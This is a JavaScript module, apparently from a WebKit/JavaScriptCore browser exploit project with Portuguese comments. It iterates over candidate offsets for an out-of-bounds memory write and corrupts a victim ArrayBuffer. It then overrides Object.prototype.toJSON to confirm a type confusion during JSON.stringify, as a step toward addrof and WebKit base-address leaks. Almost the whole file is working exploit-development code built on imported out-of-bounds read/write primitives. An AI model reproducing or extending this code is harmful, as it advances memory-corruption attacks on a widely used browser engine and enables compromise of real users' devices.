// js/script3/testArrayBufferVictimCrash.mjs (R43L - Iterar Offsets OOB)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_IterateOffsets";

const VICTIM_BUFFER_SIZE = 256;
// Vamos iterar sobre alguns offsets críticos
const CRITICAL_OOB_OFFSETS_TO_TEST = [
    0x7C, // O original que causa TC
    0x78, // Perto
    0x80, // Perto
    0x5C, // Um pouco mais distante, menor
    0x9C, // Um pouco mais distante, maior
    // Adicionar mais offsets se tiver palpites baseados em estruturas de dados
    // Por exemplo, se soubermos o tamanho de algum objeto adjacente.
    // JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET (0x10) ou M_LENGTH_OFFSET (0x18) são relativos ao ArrayBufferView,
    // não são offsets absolutos para o oob_write_absolute aqui, a menos que saibamos a base.
];
const OOB_WRITE_VALUE_FIXED = 0xABABABAB; // Valor OOB fixo para este teste

const FILL_PATTERN_ITER_OFFSETS = 0xCAFEBABE;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak;
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Iterar Offsets OOB ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init IterOffsets...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_IterOffsets() { return `target_R43L_IterOffsets_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) definida.`, 'info');

    logS3(`--- Fase 0 (IterOffsets): Sanity Checks do Core Exploit ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try {
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check (selfTestOOBReadWrite): ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical', FNAME_CURRENT_TEST_BASE);
    } catch (e_sanity) {
        logS3(`Erro durante Sanity Checks: ${e_sanity.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        coreOOBReadWriteOK = false;
    }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        logS3(`Sanity check OOB falhou. Abortando ${FNAME_CURRENT_TEST_BASE}.`, "critical", FNAME_CURRENT_TEST_BASE);
        // ... (estrutura de erro)
        return { errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, stringifyResult: null, addrof_result: { success: false, msg: "Addrof (IterOffsets): Not run due to OOB Sanity Fail.", leaked_object_addr: null, leaked_object_addr_candidate_str: null }, webkit_leak_result: { success: false, msg: "WebKit Leak (IterOffsets): Not run due to OOB Sanity Fail.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null }, iteration_results_summary: [], total_probe_calls_last_iter: 0, oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, post_oob_victim_buffer_analysis_best: null };
    }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (IterOffsets): Não tentado.", leaked_object_addr: null, leaked_object_addr_candidate_str: null },
        webkit_leak_result: { success: false, msg: "WebKit Leak (IterOffsets): Não tentado.", webkit_base_candidate: null, internal_ptr_stage1: null, internal_ptr_stage2: null },
        oob_params_of_best_result: null, // Alterado para {offset: hex, value: hex}
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        post_oob_victim_buffer_analysis_best: null
    };
    let final_probe_call_count_for_report = 0;

    for (const current_critical_offset of CRITICAL_OOB_OFFSETS_TO_TEST) { // Loop pelos offsets
        leaked_target_function_addr = null;
        const current_oob_hex_val = toHex(OOB_WRITE_VALUE_FIXED);
        const current_offset_hex = toHex(current_critical_offset);
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Offset${current_offset_hex}_OOB${current_oob_hex_val}`;
        logS3(`\n===== ITERATION IterOffsets: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} (Raw: ${OOB_WRITE_VALUE_FIXED}) =====`, "subtest", FNAME_CURRENT_ITERATION);
        document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex}`;

        let victim_typed_array_ref_iter = null;
        let iter_post_oob_analysis_details = {
            buffer_initial_head: [],
            buffer_fill_pattern_found: false,
            buffer_size: VICTIM_BUFFER_SIZE,
            notes: ""
        };

        let probe_call_count_iter = 0;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null;
        let iteration_tc_first_detection_done = false;
        let heisenbugConfirmedThisIter = false;

        function toJSON_TA_Probe_Iter_Closure_IterOffsets() {
            // ... (sonda TC idêntica à versão "PostOOB", apenas mudando o nome se desejar)
            probe_call_count_iter++; const call_num = probe_call_count_iter;
            const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null && ctts === '[object Object]');
            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_typed_array_ref_iter) {
                    marker_M2_ref_iter = { marker_id_iter_offsets: "M2_Iter_Offsets" };
                    marker_M1_ref_iter = { marker_id_iter_offsets: "M1_Iter_Offsets", payload_M2: marker_M2_ref_iter };
                    logS3(`[PROBE_IterOffsets] Call #${call_num}: 'this' é victim_typed_array. M1/M2 criados.`, "debug");
                    return marker_M1_ref_iter;
                } else if (is_m2c) {
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        heisenbugConfirmedThisIter = true;
                        iteration_final_tc_details_from_probe = {
                            call_number_tc_detected: call_num, probe_variant: "TA_Probe_IterOffsets", this_type: ctts,
                            this_is_M2: true, notes: "TC Confirmada."
                        };
                        logS3(`[PROBE_IterOffsets] Call #${call_num} (M2C): FIRST TC. ID:${this.marker_id_iter_offsets}.`, "vuln");
                    }
                    return this;
                }
            } catch (e_pm) {
                 iteration_final_tc_details_from_probe = { error_probe: `ProbeMainErr:${e_pm.message}` };
                 console.error("[PROBE_IterOffsets] Erro principal na sonda:", e_pm);
                 return { err_pm: call_num, msg: e_pm.message };
            }
            return { gen_m: call_num, type: ctts };
        }

        let iter_primary_error = null;
        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;

        try {
            logS3(`  --- Fase 1 (IterOffsets): Escrita OOB (Offset ${current_offset_hex}) e Análise ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
            oob_write_absolute(current_critical_offset, OOB_WRITE_VALUE_FIXED, 4); // Usar offset da iteração
            logS3(`   OOB Write: Escrito valor ${current_oob_hex_val} no offset ${current_offset_hex}`, 'info');
            await PAUSE_S3(50);

            const victim_buffer = new ArrayBuffer(VICTIM_BUFFER_SIZE);
            victim_typed_array_ref_iter = new Uint32Array(victim_buffer);
            victim_typed_array_ref_iter.fill(FILL_PATTERN_ITER_OFFSETS);
            logS3(`   Victim ArrayBuffer (size ${VICTIM_BUFFER_SIZE}) criado e preenchido com padrão 0x${FILL_PATTERN_ITER_OFFSETS.toString(16)}.`, 'debug_detail');
            await PAUSE_S3(100);

            logS3(`   Analisando conteúdo do victim_buffer (primeiros 64 bytes):`, 'info_emphasis');
            // ... (lógica de análise do buffer idêntica à versão "PostOOB")
            let temp_uint8_view = new Uint8Array(victim_buffer, 0, Math.min(64, VICTIM_BUFFER_SIZE));
            let found_pattern = true; let non_pattern_count = 0;
            for (let i = 0; i < temp_uint8_view.length / 4; i++) {
                let val = victim_typed_array_ref_iter[i];
                iter_post_oob_analysis_details.buffer_initial_head.push(val);
                if (val !== FILL_PATTERN_ITER_OFFSETS) { found_pattern = false; non_pattern_count++; }
                if (i < 16) { logS3(`     victim_buffer[${i*4}] (U32 idx ${i}): 0x${val.toString(16)} ${val === FILL_PATTERN_ITER_OFFSETS ? "" : "<- DIFERENTE!"}`, 'leak_detail'); }
            }
            iter_post_oob_analysis_details.buffer_fill_pattern_found = found_pattern;
            if (found_pattern) {
                iter_post_oob_analysis_details.notes = "Padrão de preenchimento encontrado.";
                logS3(`   Análise: Padrão 0x${FILL_PATTERN_ITER_OFFSETS.toString(16)} encontrado consistentemente.`, 'good');
            } else {
                iter_post_oob_analysis_details.notes = `Padrão NÃO encontrado em ${non_pattern_count} posições (Uint32). Buffer pode estar corrompido.`;
                logS3(`   Análise: Padrão 0x${FILL_PATTERN_ITER_OFFSETS.toString(16)} NÃO encontrado em ${non_pattern_count} posições (Uint32).`, 'vuln_potential');
            }


            logS3(`  --- Tentativa de Detecção de TC (IterOffsets) ---`, "subtest", FNAME_CURRENT_ITERATION);
            // ... (lógica de detecção de TC idêntica à versão "PostOOB")
            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_IterOffsets, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output, msg: e_p.message }; }
                if (heisenbugConfirmedThisIter) { logS3(`  TC Probe (IterOffsets): TC on M2 CONFIRMADA.`, "vuln", FNAME_CURRENT_ITERATION); }
                else { logS3(`  TC Probe (IterOffsets): TC on M2 NÃO Confirmada. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "warn", FNAME_CURRENT_ITERATION); }
            } catch (e_str) {
                if (!iter_primary_error) iter_primary_error = e_str;
                logS3(`  TC Probe (IterOffsets): JSON.stringify EXCEPTION: ${e_str.message}`, "error", FNAME_CURRENT_ITERATION);
            } finally {
                if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
            }
            logS3(`  --- Análise e TC (IterOffsets) Concluída. TC M2: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_ITERATION);

        } catch (e_outer_iter) {
            if (!iter_primary_error) iter_primary_error = e_outer_iter;
            logS3(`  CRITICAL ERROR ITERATION IterOffsets (Offset:${current_offset_hex}): ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_ITERATION);
        } finally {
            await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearIterOffsets` });
        }

        final_probe_call_count_for_report = probe_call_count_iter;

        let current_iter_summary = {
            oob_offset: current_offset_hex, // Incluir o offset testado
            oob_value: current_oob_hex_val, // Valor OOB (fixo neste teste)
            raw_oob_offset: current_critical_offset,
            raw_oob_value: OOB_WRITE_VALUE_FIXED,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe,
            stringifyResult: iter_stringify_output_parsed,
            post_oob_victim_buffer_analysis: iter_post_oob_analysis_details,
            addrof_result_this_iter: { success: false, msg: "Addrof (IterOffsets): Não tentado.", /*...*/ },
            webkit_leak_result_this_iter: { success: false, msg: "WebKit Leak (IterOffsets): Não tentado.", /*...*/ },
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);

        // Lógica de best_result_for_runner (priorizar TC e buffer corrompido)
        if (current_iter_summary.error === null) {
            let current_is_better_than_best = false;
            if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_params_of_best_result === null) {
                current_is_better_than_best = true;
            } else {
                const score = (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 2 : 0) +
                              (!current_iter_summary.post_oob_victim_buffer_analysis.buffer_fill_pattern_found ? 1 : 0); // Ponto se o buffer estiver corrompido
                const best_score = (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 2 : 0) +
                                   (best_result_for_runner.post_oob_victim_buffer_analysis_best && !best_result_for_runner.post_oob_victim_buffer_analysis_best.buffer_fill_pattern_found ? 1 : 0);
                if (score > best_score) {
                    current_is_better_than_best = true;
                } else if (score === best_score && score > 0) { // Se o score é igual mas positivo, preferir o que tiver TC (se o outro não tiver)
                    if (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe && !best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
                        current_is_better_than_best = true;
                    }
                }
            }

            if (current_is_better_than_best) {
                best_result_for_runner = {
                    errorOccurred: null,
                    tc_probe_details: current_iter_summary.tc_probe_details,
                    stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter,
                    webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                    oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_critical_offset, raw_value: OOB_WRITE_VALUE_FIXED },
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe,
                    post_oob_victim_buffer_analysis_best: current_iter_summary.post_oob_victim_buffer_analysis
                };
                 logS3(`*** NOVO MELHOR RESULTADO com Offset: ${current_offset_hex} ***`, "success_major", FNAME_CURRENT_ITERATION);
            }
        } else if (best_result_for_runner.oob_params_of_best_result === null && current_critical_offset === CRITICAL_OOB_OFFSETS_TO_TEST[CRITICAL_OOB_OFFSETS_TO_TEST.length - 1] ) {
            best_result_for_runner = { ...current_iter_summary, oob_params_of_best_result: {offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_critical_offset, raw_value: OOB_WRITE_VALUE_FIXED}, post_oob_victim_buffer_analysis_best: current_iter_summary.post_oob_victim_buffer_analysis };
        }

        // Título do Documento durante a iteração
        if (heisenbugConfirmedThisIter && !iter_post_oob_analysis_details.buffer_fill_pattern_found) {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Off ${current_offset_hex} TC & Buffer Corrupt!`;
        } else if (heisenbugConfirmedThisIter) {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Off ${current_offset_hex} TC OK`;
        } else if (!iter_post_oob_analysis_details.buffer_fill_pattern_found) {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Off ${current_offset_hex} Buffer Corrupt`;
        } else {
            document.title = `${FNAME_CURRENT_TEST_BASE}_R43L: Off ${current_offset_hex} Done`;
        }
        await PAUSE_S3(100);
    } // Fim do loop CRITICAL_OOB_OFFSETS_TO_TEST

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    if (best_result_for_runner.oob_params_of_best_result) {
        logS3(`Melhor resultado obtido com Offset: ${best_result_for_runner.oob_params_of_best_result.offset}, Valor: ${best_result_for_runner.oob_params_of_best_result.value}`, "info_emphasis", FNAME_CURRENT_TEST_BASE);
    } else {
        logS3(`Nenhum resultado de sucesso foi encontrado em todas as iterações.`, "critical", FNAME_CURRENT_TEST_BASE);
    }
    logS3(`Best/Final result (IterOffsets): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
    if (best_result_for_runner.oob_params_of_best_result) { // Se houve algum melhor resultado (mesmo que só erro)
        const best_oob_offset = best_result_for_runner.oob_params_of_best_result.offset;
        if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe && best_result_for_runner.post_oob_victim_buffer_analysis_best && !best_result_for_runner.post_oob_victim_buffer_analysis_best.buffer_fill_pattern_found) {
            final_title_status = `Off ${best_oob_offset}: TC & Buffer Corrupt!`;
        } else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
            final_title_status = `Off ${best_oob_offset}: TC OK`;
        } else if (best_result_for_runner.post_oob_victim_buffer_analysis_best && !best_result_for_runner.post_oob_victim_buffer_analysis_best.buffer_fill_pattern_found) {
            final_title_status = `Off ${best_oob_offset}: Buffer Corrupt`;
        } else if (best_result_for_runner.errorOccurred) {
            final_title_status = `Off ${best_oob_offset}: Error - ${best_result_for_runner.errorOccurred}`;
        } else {
            final_title_status = `Off ${best_oob_offset}: No TC/Corruption`;
        }
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        // Para compatibilidade com o runner, adaptamos o nome do campo
        oob_value_of_best_result: best_result_for_runner.oob_params_of_best_result ? `${best_result_for_runner.oob_params_of_best_result.offset}_${best_result_for_runner.oob_params_of_best_result.value}` : null,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        // Adicionar os parâmetros e a análise do buffer ao retorno principal se o runner for adaptado
        oob_params_of_best_result_detailed: best_result_for_runner.oob_params_of_best_result,
        post_oob_victim_buffer_analysis_best_result: best_result_for_runner.post_oob_victim_buffer_analysis_best
    };
}
